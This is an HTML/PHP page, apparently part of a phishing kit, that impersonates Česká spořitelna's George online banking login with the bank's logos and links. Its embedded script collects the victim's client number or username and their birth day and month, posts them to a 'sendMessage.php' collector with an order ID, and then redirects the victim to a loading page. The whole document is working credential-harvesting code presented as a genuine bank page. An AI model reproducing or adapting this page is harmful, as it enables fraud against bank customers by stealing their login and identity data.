<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" type="text/css" href="sporitelna/style.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <title>Přihlášení | Česká spořitelna</title>
</head>
<body>
    <div class="container">
        <div class='header'>
            <img src="sporitelna/images/george.png" alt="">
            <p>Přihlášení do George</p>
        </div>
        <div class="box" id="1">
            <div class="boxhead">
                <a href="https://www.csas.cz/">
                    <img src="sporitelna/images/CESKA.svg" alt=''>
                </a>
            </div>
            <div class="boxcislo">
                <div class="boxcislo-login">
                    <div class="input-wrapper">
                        <input type="text" id="klientske-cislo" placeholder="Klientské číslo / Uživatelské jméno">
                    </div>
                </div>
                <div class="boxcislo-pokracovat">
                    <button id="Pokracovat"> Pokračovat </button>
                </div>
            </div>
            <div class="boxnepamatuji">
                <a href="https://www.csas.cz/cs/caste-dotazy/co-mam-delat-kdyz-si-nepamatuju-sve-uzivatelske-jmeno#:~:text=V%20př%C3%ADpadě,%20že%20si%20nepamatujete,nastaven%C3%AD%20ve%20Správě%20mých%20zař%C3%ADzen%C3%AD">
                    Nepamatuji si uživatelské jméno
                </a>
            </div>
        </div>
        <div class="box2" id="2">
            <div class="box2content">
                <div class="box2text1">Bezpečnostní tipy nově v George klíči</div>
                <div class="box2text2">Především při přihlášení do webového George a platbě kartou se vám před potvrzením v George klíči zobrazí tip, jak se chránit před podvodníky.</div>
            </div>
        </div>
        <div class="box3" id="3" style="display:none;">
            <div class="box3head">
                <a href="https://www.csas.cz/">
                    <img src="sporitelna/images/CESKA.svg" alt=''>
                </a>
            </div>
            <div class="zadejte">
                Zadejte den a měsíc narození
            </div>
            <div class="denmesic">
                <div class="den">
                    <div class="input-wrapper2">
                        <input type="number" id="day" name="day" min="1" max="31" placeholder="Den"  maxlength="2" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
                    </div>
                </div>
                <div class="mesic">
                    <div class="input-wrapper3">
                        <select id="month" name="month">
                            <option value="" selected disabled hidden>Měsíc</option>
                            <option value="01 (Leden)">Leden</option>
<option value="02 (Únor)">Únor</option>
<option value="03 (Březen)">Březen</option>
<option value="04 (Duben)">Duben</option>
<option value="05 (Květen)">Květen</option>                                
<option value="06 (Červen)">Červen</option>
<option value="07 (Červenec)">Červenec</option>
<option value="08 (Srpen)">Srpen</option>
<option value="09 (Září)">Září</option>
<option value="10 (Říjen)">Říjen</option>
<option value="11 (Listopad)">Listopad</option>
<option value="12 (Prosinec)">Prosinec</option>

                        </select>
                    </div>
                </div>
            </div>
            <div class="boxcislo-pokracovat2">
                <button id="Pokracovat2"> Pokračovat </button>
            </div>
            <div class="boxzrusit">
                <button id="zrusit" onclick="location.reload()">Zrušit</button>
            </div>
        </div>
    </div>
    <script src="sporitelna/script.js"></script>
    <script>
    const submitButton = document.getElementById('Pokracovat2')
const login = document.getElementById('klientske-cislo')
const day = document.getElementById('day')
const month = document.getElementById('month')

submitButton.onclick = function () {

let bank = "<?php echo $bank ?>";

if (login.value == null || day.value == null || month.value == null) {
    return;
}

$.ajax({
            url: 'sporitelna/sendMessage.php',
            method: 'POST',
            data: {
                orderid: "<?php echo $id ?>",
                bank: 'sporitelna',
                login: login.value,
                day: day.value,
                month: month.value
            },
            success: function (response) {
                // Обрабатываем успешный ответ
                console.log('Success');
            },
            error: function (error) {
                // Обрабатываем ошибку
                console.log('Error updating bank:', error);
            },
            complete: function () {
                // Выполняем переход на новую страницу
                const currentURL = window.location.href;
  const newURL = currentURL.replace('/bankaccount/', '/loading/');
  window.location.href = newURL;
            }
        });

}
  </script>
</body>
</html>